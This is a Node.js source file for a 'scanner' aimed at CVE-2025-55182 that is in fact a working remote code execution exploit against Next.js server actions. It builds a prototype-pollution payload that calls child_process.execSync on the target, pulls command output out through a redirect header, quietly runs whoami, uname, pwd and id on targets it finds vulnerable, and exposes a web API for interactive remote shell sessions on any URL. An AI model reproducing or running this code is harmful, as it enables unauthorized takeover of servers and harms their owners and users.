#!/usr/bin/env node

/**
 * React2Shell Scanner - CVE-2025-55182
 * Complete Node.js Implementation with Web Interface
 * Server Backend
 */

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');

const PORT = process.env.PORT || 3000;

// In-memory storage for scan results and sessions
const scanResults = new Map();
const activeSessions = new Map();

/**
 * Build CVE-2025-55182 exploit payload
 */
function buildExploitPayload(command) {
  const boundary = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad';
  const cmdEscaped = command.replace(/'/g, "\\'").replace(/"/g, '\\"');

  // Core RCE Logic - Prototype pollution + command injection
  const prefixPayload = 
    `var res=process.mainModule.require('child_process').execSync('${cmdEscaped}',{'timeout':10000}).toString('base64');` +
    `throw Object.assign(new Error('NEXT_REDIRECT'), {digest:\`NEXT_REDIRECT;push;/login?a=\${res};307;\`});`;

  const part0 = 
    '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,' +
    '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"' +
    prefixPayload +
    '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}';

  const parts = [
    `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
    `Content-Disposition: form-data; name="0"\r\n\r\n` +
    `${part0}\r\n`,
    
    `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
    `Content-Disposition: form-data; name="1"\r\n\r\n` +
    `"$@0"\r\n`,
    
    `------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n` +
    `Content-Disposition: form-data; name="2"\r\n\r\n` +
    `[]\r\n`,
    
    `------WebKitFormBoundaryx8jO2oVc6SWP3Sad--`
  ];

  const body = parts.join('');
  const contentType = `multipart/form-data; boundary=${boundary}`;
  
  return { body, contentType };
}

/**
 * Execute command on target via HTTP exploit
 */
function executeCommand(targetUrl, command, sessionData = {}) {
  return new Promise((resolve, reject) => {
    try {
      // Prepare command with directory context
      let finalCmd = command;
      
      if (sessionData.currentDir) {
        finalCmd = `cd ${sessionData.currentDir} && ${command}`;
      }
      
      finalCmd = `(${finalCmd}) 2>&1 || true`;

      const { body, contentType } = buildExploitPayload(finalCmd);
      const parsedUrl = new URL(targetUrl);
      const isHttps = parsedUrl.protocol === 'https:';
      const httpModule = isHttps ? https : http;

      const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (isHttps ? 443 : 80),
        path: parsedUrl.pathname + parsedUrl.search,
        method: 'POST',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Next-Action': 'x',
          'X-Nextjs-Request-Id': 'b5dce965',
          'Content-Type': contentType,
          'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9',
          'Content-Length': Buffer.byteLength(body)
        },
        rejectUnauthorized: false,
        timeout: 15000
      };

      const req = httpModule.request(options, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          const redirectHeader = res.headers['x-action-redirect'] || '';
          const locationHeader = res.headers['location'] || '';
          
          let match = redirectHeader.match(/.*\/login\?a=(.*?)(?:;|$)/);
          if (!match) {
            match = locationHeader.match(/login\?a=(.*?)(?:;|$)/);
          }

          if (match) {
            try {
              const outputB64 = decodeURIComponent(match[1]);
              const decoded = Buffer.from(outputB64, 'base64').toString('utf-8');
              resolve({
                success: true,
                output: decoded.trim(),
                statusCode: res.statusCode
              });
            } catch (err) {
              resolve({
                success: false,
                error: `Failed to decode output: ${err.message}`,
                statusCode: res.statusCode
              });
            }
          } else {
            // Better error messaging based on status code
            let errorMsg = '';
            if (res.statusCode === 404) {
              errorMsg = 'Target endpoint not found (404). The Next.js server action may not exist.';
            } else if (res.statusCode === 403) {
              errorMsg = 'Access forbidden (403). Target may have security restrictions.';
            } else if (res.statusCode >= 500) {
              errorMsg = `Server error (${res.statusCode}). Target may not be vulnerable.`;
            } else {
              errorMsg = `No exploit response (Status: ${res.statusCode}). Target is likely not vulnerable.`;
            }
            
            resolve({
              success: false,
              error: errorMsg,
              statusCode: res.statusCode,
              vulnerable: false
            });
          }
        });
      });

      req.on('error', (err) => {
        resolve({
          success: false,
          error: `Request failed: ${err.message}`
        });
      });

      req.on('timeout', () => {
        req.destroy();
        resolve({
          success: false,
          error: 'Request timed out'
        });
      });

      req.write(body);
      req.end();
    } catch (error) {
      resolve({
        success: false,
        error: error.message
      });
    }
  });
}

/**
 * Scan target for vulnerability
 */
async function scanTarget(targetUrl) {
  const scanId = Date.now().toString();
  const startTime = new Date();
  
  scanResults.set(scanId, {
    id: scanId,
    target: targetUrl,
    status: 'running',
    startTime,
    steps: []
  });

  const addStep = (step, status, details) => {
    const scan = scanResults.get(scanId);
    scan.steps.push({ step, status, details, timestamp: new Date() });
    scanResults.set(scanId, scan);
  };

  try {
    // Step 1: Basic connectivity check
    addStep('Connectivity Check', 'running', 'Testing connection to target...');
    const connectResult = await executeCommand(targetUrl, 'echo "VULN_TEST_123"');
    
    if (!connectResult.success) {
      addStep('Connectivity Check', 'failed', connectResult.error || 'Connection failed');
      addStep('Vulnerability Detection', 'failed', '✗ Cannot determine - Connection failed');
      scanResults.get(scanId).status = 'completed';
      scanResults.get(scanId).vulnerable = false;
      scanResults.get(scanId).endTime = new Date();
      return scanId;
    }
    
    addStep('Connectivity Check', 'success', 'Connection established');

    // Step 2: Vulnerability detection
    addStep('Vulnerability Detection', 'running', 'Testing for CVE-2025-55182...');
    
    if (connectResult.output && connectResult.output.includes('VULN_TEST_123')) {
      addStep('Vulnerability Detection', 'success', '✓ Target is VULNERABLE to CVE-2025-55182');
      
      // Silently gather system information in background (no step display)
      const whoamiResult = await executeCommand(targetUrl, 'whoami');
      const unameResult = await executeCommand(targetUrl, 'uname -a');
      const pwdResult = await executeCommand(targetUrl, 'pwd');
      const idResult = await executeCommand(targetUrl, 'id');
      
      const sysInfo = {
        user: whoamiResult.success ? whoamiResult.output : 'unknown',
        system: unameResult.success ? unameResult.output : 'unknown',
        workingDir: pwdResult.success ? pwdResult.output : 'unknown',
        userId: idResult.success ? idResult.output : 'unknown'
      };
      
      scanResults.get(scanId).status = 'completed';
      scanResults.get(scanId).vulnerable = true;
      scanResults.get(scanId).systemInfo = sysInfo;
      
    } else {
      addStep('Vulnerability Detection', 'failed', '✗ Target is NOT vulnerable to CVE-2025-55182');
      scanResults.get(scanId).status = 'completed';
      scanResults.get(scanId).vulnerable = false;
    }
    
    scanResults.get(scanId).endTime = new Date();
    return scanId;
    
  } catch (error) {
    addStep('Error', 'failed', error.message);
    scanResults.get(scanId).status = 'completed';
    scanResults.get(scanId).vulnerable = false;
    scanResults.get(scanId).endTime = new Date();
    return scanId;
  }
}

/**
 * Simple HTTP server with routing
 */
const server = http.createServer(async (req, res) => {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }

  // Route: Serve main HTML page
  if (req.url === '/' || req.url === '/index.html') {
    const htmlPath = path.join(__dirname, 'index.html');
    if (fs.existsSync(htmlPath)) {
      const html = fs.readFileSync(htmlPath, 'utf-8');
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(html);
    } else {
      res.writeHead(404);
      res.end('index.html not found');
    }
    return;
  }

  // Route: Start scan
  if (req.url === '/api/scan' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const { targetUrl } = JSON.parse(body);
        if (!targetUrl) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'targetUrl is required' }));
          return;
        }

        const scanId = await scanTarget(targetUrl);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ scanId }));
      } catch (error) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: error.message }));
      }
    });
    return;
  }

  // Route: Get scan results
  if (req.url.startsWith('/api/scan/') && req.method === 'GET') {
    const scanId = req.url.split('/')[3];
    const result = scanResults.get(scanId);
    
    if (result) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(result));
    } else {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Scan not found' }));
    }
    return;
  }

  // Route: Create shell session
  if (req.url === '/api/session/create' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const { targetUrl } = JSON.parse(body);
        const sessionId = Date.now().toString();
        
        activeSessions.set(sessionId, {
          id: sessionId,
          targetUrl,
          currentDir: null,
          history: [],
          created: new Date()
        });
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ sessionId }));
      } catch (error) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: error.message }));
      }
    });
    return;
  }

  // Route: Execute command in session
  if (req.url === '/api/session/execute' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const { sessionId, command } = JSON.parse(body);
        const session = activeSessions.get(sessionId);
        
        if (!session) {
          res.writeHead(404, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'Session not found' }));
          return;
        }

        // Handle special commands
        // Handle cd command
        if (command.startsWith('cd ')) {
          const targetPath = command.substring(3).trim();
          const checkCmd = `cd ${targetPath} && pwd`;
          const result = await executeCommand(session.targetUrl, checkCmd, session);
          
          if (result.success && result.output.startsWith('/')) {
            session.currentDir = result.output.split('\n')[0].trim();
            activeSessions.set(sessionId, session);
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
              success: true,
              output: '',
              currentDir: session.currentDir
            }));
          } else {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
              success: false,
              output: result.output || 'Directory not found'
            }));
          }
          return;
        }

        // Update current directory if not set
        if (!session.currentDir) {
          const pwdResult = await executeCommand(session.targetUrl, 'pwd', session);
          if (pwdResult.success && pwdResult.output.includes('/')) {
            session.currentDir = pwdResult.output.split('\n')[0].trim();
            activeSessions.set(sessionId, session);
          }
        }

        // Execute regular command
        const result = await executeCommand(session.targetUrl, command, session);
        
        session.history.push({
          command,
          output: result.output,
          timestamp: new Date()
        });
        activeSessions.set(sessionId, session);

        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          success: result.success,
          output: result.output || result.error,
          currentDir: session.currentDir
        }));
      } catch (error) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: error.message }));
      }
    });
    return;
  }

  // Route: Get session info
  if (req.url.startsWith('/api/session/') && req.method === 'GET') {
    const sessionId = req.url.split('/')[3];
    const session = activeSessions.get(sessionId);
    
    if (session) {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(session));
    } else {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Session not found' }));
    }
    return;
  }

  // 404
  res.writeHead(404);
  res.end('Not Found');
});

server.listen(PORT, () => {
  console.log(`
╔════════════════════════════════════════════════════════════╗
║        React2Shell Scanner - CVE-2025-55182                ║
║        Node.js Web Interface                               ║
╚════════════════════════════════════════════════════════════╝

Server running at:
  → http://localhost:${PORT}
  → http://127.0.0.1:${PORT}

Press Ctrl+C to stop
  `);
});

module.exports = { executeCommand, scanTarget };